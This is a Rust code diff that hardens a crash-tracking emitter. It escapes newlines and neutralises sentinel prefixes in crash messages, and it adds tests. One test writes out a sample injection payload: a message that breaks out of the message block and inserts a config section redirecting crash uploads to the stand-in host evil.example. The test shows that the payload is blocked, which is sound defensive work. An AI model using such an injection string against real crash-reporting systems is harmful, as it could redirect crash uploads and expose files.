@@ -445,12 +445,56 @@ fn emit_metadata(w: &mut impl Write, metadata_str: &str) -> Result<(), EmitterEr
     Ok(())
 }
 
+/// Write message content to the wire, escaping newlines and neutralizing sentinel
+/// prefixes with no allocation, as this is called in the signal handler path.
+///
+/// The receiver's state machine splits input on newlines and treats any line
+/// starting with `DD_CRASHTRACK_` as a protocol sentinel. If unsanitized
+/// user-controlled content (an exception message passed through the FFI)
+/// contains embedded newlines or sentinel-like text, it can break out of the
+/// message block and inject arbitrary protocol sections, including a config
+/// section that controls which endpoint receives the crash upload and arbitrary files
+/// to include in the crash report.
+///
+/// This function streams directly to `w`:
+/// 1. Escapes real `\n`/`\r` to `\\n`/`\\r` so the content stays on one wire line (the receiver
+///    reverses this by replacing `\\n`/`\\r` with `\n`/`\r`)
+/// 2. Prefixes with a space if the content starts with `DD_CRASHTRACK_` to prevent the receiver
+///    from matching it as a sentinel
+/// 3. Terminates with a newline
+fn write_sanitized_message_line(w: &mut impl Write, message: &str) -> Result<(), EmitterError> {
+    if message.starts_with("DD_CRASHTRACK_") {
+        w.write_all(b" ")?;
+    }
+    let bytes = message.as_bytes();
+    let mut start = 0;
+    for (i, &byte) in bytes.iter().enumerate() {
+        let escape: Option<&[u8]> = match byte {
+            b'\n' => Some(b"\\n"),
+            b'\r' => Some(b"\\r"),
+            _ => None,
+        };
+        if let Some(replacement) = escape {
+            if start < i {
+                w.write_all(&bytes[start..i])?;
+            }
+            w.write_all(replacement)?;
+            start = i + 1;
+        }
+    }
+    if start < bytes.len() {
+        w.write_all(&bytes[start..])?;
+    }
+    w.write_all(b"\n")?;
+    Ok(())
+}
+
 fn emit_message(w: &mut impl Write, message_ptr: *mut String) -> Result<(), EmitterError> {
     if !message_ptr.is_null() {
         let message = unsafe { &*message_ptr };
         if !message.trim().is_empty() {
             writeln!(w, "{DD_CRASHTRACK_BEGIN_MESSAGE}")?;
-            writeln!(w, "{message}")?;
+            write_sanitized_message_line(w, message)?;
             writeln!(w, "{DD_CRASHTRACK_END_MESSAGE}")?;
             w.flush()?;
         }
@@ -869,6 +913,12 @@ mod tests {
         assert!(out.contains("line2"));
         assert!(out.contains("line3"));
 
+        // Newlines must be escaped on the wire so the message stays on one
+        // protocol line and cannot inject sentinel-delimited sections.
+        let lines: Vec<&str> = out.lines().collect();
+        assert_eq!(lines.len(), 3, "BEGIN_MESSAGE, content, END_MESSAGE");
+        assert!(lines[1].contains("line1\\nline2\\nline3"));
+
         unsafe { drop(Box::from_raw(message_ptr)) };
     }
 
@@ -902,6 +952,97 @@ mod tests {
 
         assert!(proc_info_block.contains(&format!("\"pid\": {pid}")));
         assert!(proc_info_block.contains(&format!("\"tid\": {tid}")));
+    }
+
+    #[test]
+    #[cfg_attr(miri, ignore)]
+    fn test_emit_message_sentinel_injection_via_newline() {
+        // An attacker-controlled error_type/message containing newlines and sentinel
+        // strings could break out of the MESSAGE block and inject a CONFIG section
+        // that controls the crash upload endpoint.
+        let malicious = format!(
+            "innocent prefix\n{}\n{}\n{{\"endpoint\":\"https://evil.example\"}}\n{}\n{}",
+            DD_CRASHTRACK_END_MESSAGE,
+            DD_CRASHTRACK_BEGIN_CONFIG,
+            DD_CRASHTRACK_END_CONFIG,
+            DD_CRASHTRACK_DONE,
+        );
+        let message_ptr = Box::into_raw(Box::new(malicious));
+        let mut buf = Vec::new();
+
+        emit_message(&mut buf, message_ptr).expect("to work");
+        let out = str::from_utf8(&buf).expect("to be valid UTF8");
+
+        let lines: Vec<&str> = out.lines().collect();
+        // Must be exactly 3 wire lines: BEGIN, content, END
+        assert_eq!(
+            lines.len(),
+            3,
+            "sentinel injection must not create extra lines"
+        );
+        assert_eq!(lines[0], DD_CRASHTRACK_BEGIN_MESSAGE);
+        assert_eq!(lines[2], DD_CRASHTRACK_END_MESSAGE);
+
+        // The injected sentinels must NOT appear as separate lines
+        assert!(
+            !lines.contains(&DD_CRASHTRACK_BEGIN_CONFIG),
+            "injected BEGIN_CONFIG must not appear as a wire line"
+        );
+        assert!(
+            !lines.contains(&DD_CRASHTRACK_DONE),
+            "injected DONE must not appear as a wire line"
+        );
+
+        unsafe { drop(Box::from_raw(message_ptr)) };
+    }
+
+    #[test]
+    #[cfg_attr(miri, ignore)]
+    fn test_emit_message_content_starting_with_sentinel_prefix() {
+        let sentinel_message = format!("{} extra data", DD_CRASHTRACK_END_MESSAGE);
+        let message_ptr = Box::into_raw(Box::new(sentinel_message));
+        let mut buf = Vec::new();
+
+        emit_message(&mut buf, message_ptr).expect("to work");
+        let out = str::from_utf8(&buf).expect("to be valid UTF8");
+
+        let lines: Vec<&str> = out.lines().collect();
+        assert_eq!(lines.len(), 3);
+        // The content line shouldn't start with the sentinel prefix
+        assert!(
+            !lines[1].starts_with("DD_CRASHTRACK_"),
+            "content line must not start with sentinel prefix, got: {}",
+            lines[1]
+        );
+
+        unsafe { drop(Box::from_raw(message_ptr)) };
+    }
+
+    #[test]
+    #[cfg_attr(miri, ignore)]
+    fn test_write_sanitized_message_line_basic() {
+        let mut buf = Vec::new();
+        write_sanitized_message_line(&mut buf, "hello").unwrap();
+        assert_eq!(buf, b"hello\n");
+
+        buf.clear();
+        write_sanitized_message_line(&mut buf, "line1\nline2").unwrap();
+        assert_eq!(buf, b"line1\\nline2\n");
+
+        buf.clear();
+        write_sanitized_message_line(&mut buf, "a\r\nb").unwrap();
+        assert_eq!(buf, b"a\\r\\nb\n");
+    }
+
+    #[test]
+    #[cfg_attr(miri, ignore)]
+    fn test_write_sanitized_message_line_sentinel_prefix() {
+        let input = format!("{} injected", DD_CRASHTRACK_END_MESSAGE);
+        let mut buf = Vec::new();
+        write_sanitized_message_line(&mut buf, &input).unwrap();
+        let out = str::from_utf8(&buf).unwrap();
+        assert!(!out.starts_with("DD_CRASHTRACK_"));
+        assert!(out.starts_with(' '));
     }
 
     #[test]
